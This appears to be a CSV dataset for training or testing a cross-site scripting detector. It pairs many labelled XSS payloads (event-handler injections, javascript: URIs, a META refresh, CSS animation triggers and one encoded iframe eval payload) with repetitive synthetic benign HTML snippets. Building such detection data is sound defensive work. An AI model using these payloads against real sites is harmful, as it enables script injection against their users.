text,label,source,length,timestamp
"<marquee draggable=""true"" ondragenter=""alert(1)"">test</marquee>",1,payloadbox,63,2026-02-09T15:05:27.718768
"<menuitem onmouseover=""alert(1)"">test</menuitem>",1,payloadbox,48,2026-02-09T15:05:27.718768
<select id=x tabindex=1 onactivate=alert(1)></select>,1,payloadbox,53,2026-02-09T15:05:27.720768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.736778
"<dir onpaste=""alert(1)"" contenteditable>test</dir>",1,payloadbox,50,2026-02-09T15:05:27.716766
"<style>:target {color:red;}</style><blink id=x style=""transition:color 1s"" ontransitionend=alert(1)></blink>",1,payloadbox,108,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.738766
<th id=x tabindex=1 onfocusin=alert(1)></th>,1,payloadbox,44,2026-02-09T15:05:27.723765
<x onmousedown=alert(1)>click this!,1,payloadbox,35,2026-02-09T15:05:27.713767
"<sub draggable=""true"" ondragleave=""alert(1)"">test</sub>",1,payloadbox,55,2026-02-09T15:05:27.722765
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",1,payloadbox,52,2026-02-09T15:05:27.714766
<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,1,payloadbox,63,2026-02-09T15:05:27.715767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.743765
<span class='class-4414'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
"<dir ondblclick=""alert(1)"">test</dir>",1,payloadbox,37,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.738766
<span class='class-5084'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
<textarea onselect=alert(1) autofocus>XSS</textarea>,1,payloadbox,52,2026-02-09T15:05:27.723765
<x %6Fnxxx=1,1,payloadbox,12,2026-02-09T15:05:27.713767
"<style>:target {color:red;}</style><big id=x style=""transition:color 1s"" ontransitionend=alert(1)></big>",1,payloadbox,104,2026-02-09T15:05:27.721766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.727768
"<meter onmouseup=""alert(1)"">test</meter>",1,payloadbox,40,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.742765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.733766
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationend=""alert(1)""></footer>",1,payloadbox,97,2026-02-09T15:05:27.722765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.739765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.740766
"<slot onpaste=""alert(1)"" contenteditable>test</slot>",1,payloadbox,52,2026-02-09T15:05:27.720768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.733766
"<strike onmousemove=""alert(1)"">test</strike>",1,payloadbox,44,2026-02-09T15:05:27.721766
"<time oncut=""alert(1)"" contenteditable>test</time>",1,payloadbox,50,2026-02-09T15:05:27.723765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.736778
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",1,payloadbox,109,2026-02-09T15:05:27.716766
"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",1,payloadbox,122,2026-02-09T15:05:27.721766
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>",1,payloadbox,101,2026-02-09T15:05:27.716766
"<link onpaste=""alert(1)"" contenteditable>test</link>",1,payloadbox,52,2026-02-09T15:05:27.718768
"<input ondblclick=""alert(1)"">test</input>",1,payloadbox,41,2026-02-09T15:05:27.718768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.737767
"<menuitem oncontextmenu=""alert(1)"">test</menuitem>",1,payloadbox,50,2026-02-09T15:05:27.718768
<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>,1,payloadbox,72,2026-02-09T15:05:27.715767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.725769
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,1,payloadbox,56,2026-02-09T15:05:27.719771
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.743765
"<mark onbeforecopy=""alert(1)"" contenteditable>test</mark>",1,payloadbox,57,2026-02-09T15:05:27.718768
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>,1,payloadbox,60,2026-02-09T15:05:27.724768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.742765
"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",1,payloadbox,160,2026-02-09T15:05:27.721766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.739765
"<h1 onmouseenter=""alert(1)"">test</h1>",1,payloadbox,37,2026-02-09T15:05:27.717767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.739765
"<meter onclick=""alert(1)"">test</meter>",1,payloadbox,38,2026-02-09T15:05:27.719771
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.735774
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.725769
<span class='class-1134'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
"<caption onmouseover=""alert(1)"">test</caption>",1,payloadbox,46,2026-02-09T15:05:27.715767
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",1,payloadbox,182,2026-02-09T15:05:27.722765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.740766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
<svg onunload=window.open('javascript:alert(1)')>,1,payloadbox,49,2026-02-09T15:05:27.722765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.728766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.743765
"<style>@keyframes slidein {}</style><span style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></span>",1,payloadbox,162,2026-02-09T15:05:27.722765
"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>",1,payloadbox,107,2026-02-09T15:05:27.716766
"<meta onmouseup=""alert(1)"">test</meta>",1,payloadbox,38,2026-02-09T15:05:27.719771
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.741766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.737767
<span class='class-2184'>Services</span>,0,generated,40,2026-02-09T15:05:27.731765
"<center onmouseenter=""alert(1)"">test</center>",1,payloadbox,45,2026-02-09T15:05:27.715767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.735774
"<video onmouseover=""alert(1)"">test</video>",1,payloadbox,42,2026-02-09T15:05:27.724768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.731765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.731765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
"<time draggable=""true"" ondragleave=""alert(1)"">test</time>",1,payloadbox,57,2026-02-09T15:05:27.723765
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",1,payloadbox,59,2026-02-09T15:05:27.717767
<span class='class-1824'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.729765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.741766
"<style>:target {transform: rotate(180deg);}</style><rb id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rb>",1,payloadbox,122,2026-02-09T15:05:27.721766
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,1,payloadbox,52,2026-02-09T15:05:27.714766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
"<image xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",1,payloadbox,114,2026-02-09T15:05:27.725769
<time id=x tabindex=1 onactivate=alert(1)></time>,1,payloadbox,49,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.743765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.731765
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",1,payloadbox,57,2026-02-09T15:05:27.714766
<area id=x tabindex=1 onactivate=alert(1)></area>,1,payloadbox,49,2026-02-09T15:05:27.714766
"<basefont onmouseup=""alert(1)"">test</basefont>",1,payloadbox,46,2026-02-09T15:05:27.714766
<svg><big onload=alert(1)></big>,1,payloadbox,32,2026-02-09T15:05:27.722765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.741766
"<param onbeforepaste=""alert(1)"" contenteditable>test</param>",1,payloadbox,60,2026-02-09T15:05:27.719771
"<style>:target {color:red;}</style><dd id=x style=""transition:color 1s"" ontransitionend=alert(1)></dd>",1,payloadbox,102,2026-02-09T15:05:27.721766
<span class='class-6194'>Services</span>,0,generated,40,2026-02-09T15:05:27.743765
"<input onkeypress=""alert(1)"" contenteditable>test</input>",1,payloadbox,57,2026-02-09T15:05:27.718768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
<span class='class-5054'>Services</span>,0,generated,40,2026-02-09T15:05:27.739765
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",1,payloadbox,55,2026-02-09T15:05:27.714766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.730765
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",1,payloadbox,57,2026-02-09T15:05:27.714766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.743765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.727768
"<ul onmousedown=""alert(1)"">test</ul>",1,payloadbox,36,2026-02-09T15:05:27.724768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
"<html onkeyup=""alert(1)"" contenteditable>test</html>",1,payloadbox,52,2026-02-09T15:05:27.717767
"<del onbeforecut=""alert(1)"" contenteditable>test</del>",1,payloadbox,54,2026-02-09T15:05:27.716766
<IMG SRC=JaVaScRiPt:alert('XSS')>,1,payloadbox,33,2026-02-09T15:05:27.724768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.726766
"<xmp onmouseup=""alert(1)"">test</xmp>",1,payloadbox,36,2026-02-09T15:05:27.724768
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",1,payloadbox,103,2026-02-09T15:05:27.722765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
"<menu onbeforecopy=""alert(1)"" contenteditable>test</menu>",1,payloadbox,57,2026-02-09T15:05:27.718768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.728766
<table id=x tabindex=1 onactivate=alert(1)></table>,1,payloadbox,51,2026-02-09T15:05:27.723765
"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></image>",1,payloadbox,113,2026-02-09T15:05:27.721766
<noembed id=x tabindex=1 onactivate=alert(1)></noembed>,1,payloadbox,55,2026-02-09T15:05:27.719771
<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.719771
"<dialog draggable=""true"" ondragend=""alert(1)"">test</dialog>",1,payloadbox,59,2026-02-09T15:05:27.716766
"<template onclick=""alert(1)"">test</template>",1,payloadbox,44,2026-02-09T15:05:27.723765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.730765
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,1,payloadbox,68,2026-02-09T15:05:27.720768
"<th onkeydown=""alert(1)"" contenteditable>test</th>",1,payloadbox,50,2026-02-09T15:05:27.723765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.743765
<span class='class-2914'>Services</span>,0,generated,40,2026-02-09T15:05:27.733766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1,payloadbox,81,2026-02-09T15:05:27.724768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.740766
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,1,payloadbox,61,2026-02-09T15:05:27.714766
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,1,payloadbox,64,2026-02-09T15:05:27.716766
<span class='class-5204'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.730765
"<textarea onmouseover=""alert(1)"">test</textarea>",1,payloadbox,48,2026-02-09T15:05:27.723765
"<image oncopy=""alert(1)"" contenteditable>test</image>",1,payloadbox,53,2026-02-09T15:05:27.717767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.727768
"<textarea onmousemove=""alert(1)"">test</textarea>",1,payloadbox,48,2026-02-09T15:05:27.723765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.738766
<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>,1,payloadbox,59,2026-02-09T15:05:27.718768
"<label oncut=""alert(1)"" contenteditable>test</label>",1,payloadbox,52,2026-02-09T15:05:27.718768
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.737767
"<canvas onmousemove=""alert(1)"">test</canvas>",1,payloadbox,44,2026-02-09T15:05:27.715767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.728766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.741766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.738766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.726766
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",1,payloadbox,99,2026-02-09T15:05:27.722765
"<! '=""foo""><x foo='><img src=x onerror=alert(2)//'>",1,payloadbox,51,2026-02-09T15:05:27.725769
"<code onmousedown=""alert(1)"">test</code>",1,payloadbox,40,2026-02-09T15:05:27.715767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.735774
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.744765
"<iframe onmouseenter=""alert(1)"">test</iframe>",1,payloadbox,45,2026-02-09T15:05:27.717767
"<figcaption onmouseover=""alert(1)"">test</figcaption>",1,payloadbox,52,2026-02-09T15:05:27.717767
"<article onmousedown=""alert(1)"">test</article>",1,payloadbox,46,2026-02-09T15:05:27.714766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
<span class='class-354'>Services</span>,0,generated,39,2026-02-09T15:05:27.726766
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,1,payloadbox,70,2026-02-09T15:05:27.721766
"<dialog onmousedown=""alert(1)"">test</dialog>",1,payloadbox,44,2026-02-09T15:05:27.716766
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E,1,payloadbox,79,2026-02-09T15:05:27.724768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.731765
"top[""al""+""ert""](1)",1,payloadbox,18,2026-02-09T15:05:27.714766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.736778
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.726766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.732765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.734777
"<html draggable=""true"" ondragenter=""alert(1)"">test</html>",1,payloadbox,57,2026-02-09T15:05:27.717767
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></br>",1,payloadbox,174,2026-02-09T15:05:27.722765
"<col draggable=""true"" ondragend=""alert(1)"">test</col>",1,payloadbox,53,2026-02-09T15:05:27.715767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.732765
"<div id=""125""><?xml version=""1.0""?>",1,payloadbox,35,2026-02-09T15:05:27.725769
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.742765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.728766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.728766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.725769
"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>",1,payloadbox,105,2026-02-09T15:05:27.716766
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",1,payloadbox,110,2026-02-09T15:05:27.721766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.736778
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1,payloadbox,42,2026-02-09T15:05:27.724768
<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,1,payloadbox,64,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.738766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.736778
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",1,payloadbox,423,2026-02-09T15:05:27.724768
"<div oncontextmenu=""alert(1)"">test</div>",1,payloadbox,40,2026-02-09T15:05:27.716766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.729765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.732765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.743765
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ins>",1,payloadbox,176,2026-02-09T15:05:27.722765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.736778
"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",1,payloadbox,53,2026-02-09T15:05:27.715767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.735774
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.733766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.744765
